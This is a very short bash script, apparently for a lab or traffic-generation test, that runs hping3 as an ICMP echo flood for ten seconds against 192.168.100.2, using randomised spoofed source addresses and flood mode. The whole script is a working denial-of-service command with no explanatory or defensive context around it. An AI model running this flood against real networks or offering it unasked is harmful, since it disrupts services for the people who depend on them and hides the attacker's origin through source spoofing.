#!/bin/bash

# Hping3 ICMP Echo Flood (10 seconds)
sudo timeout 10 hping3 -1 192.168.100.2 --rand-source -d 0 --flood
